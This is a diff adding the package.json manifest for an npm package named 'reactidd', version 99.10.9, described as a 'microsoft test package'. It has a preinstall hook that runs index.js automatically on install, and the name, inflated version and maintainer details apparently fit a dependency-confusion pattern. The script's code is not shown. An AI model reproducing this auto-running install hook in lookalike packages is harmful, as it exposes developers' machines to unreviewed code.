@@ -1,0 +1,39 @@
+{
+    "name": "reactidd",
+    "version": "99.10.9",
+    "description": "microsoft test package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "reactidd@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-4Yv34gtDG+vwTexcL0HKgeWE3oNzulOgkDH+8eTY8JVj5pxVRYxKNfg7u1lwXgMRIYog3RsP4oB/b2oLvqxHcw==",
+        "shasum": "2255e66acca597c588f9e6a9905d4a068fbbe390",
+        "tarball": "https://registry.npmjs.org/reactidd/-/reactidd-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3218,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhmp+VCRA9TVsSAnZWagAA6REP/j5I/34TzqxqqzPwbCJm\nrKz+XACyWXm6hJABxxGF9a6qGm9HBp1S9CUhZ60thnO6ppvMTiPrN7+CeKoO\nydzVpzlDSlvszg570rtbiswqLDahg6FP2hW28FJXRd32v+qGRScOZE0qCmim\nlTDiufyOtC8Hh5Tvuo+OkG/qyOiseYXtABCDgffwE2Yb1MzPBrK0BqRDH+83\nBvgKC+8tksc2QIidCDWFARYg7+bfYfSBHl0wOFXVIRffmb6WhTrWe0Bo6EAP\nRxR/e5ERlb8G6GKY0ra+oOomfieBLb0opWok3i69y5vOxa96zB8xK+pzODIH\nLhbRT7E//LJOoRn0+t4e62lON44uhW++8b0QsFi3wCjot7KaJ1LFCgafmhlh\n/rUKVB3R7tgSznDKM5m18HvrtcFglbGARHf7UuxejzIEzHrGFvY5nL9u2rY8\nmfwt27i41BBDZCzHT0Z5DmaS9TjcMRaDj3yze11+QGyXPtJGLR+7iFhRBmJP\numWGAgwDLy4YGAGgNrnccFR3DvEu8VLSQjJQombSWAbIlYKYpk7XiAuFIU5z\nfWN6qpGmwaPGwy0buHixGVFWo4GH0ERBoh0/pryxcwy87gd5OV9S5tO99OeO\n87hLKPzVswA0elujmyRWUUn5Ao2za8GrwEg1m5RmgilbslxZrVOPu4ZFx7+a\nme4x\r\n=lHpP\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "hussam22",
+        "email": "hussam.tes09@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "hussam22",
+            "email": "hussam.tes09@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/reactidd_99.10.9_1637523349336_0.934260749457509"
+    },
+    "_hasShrinkwrap": false
+}
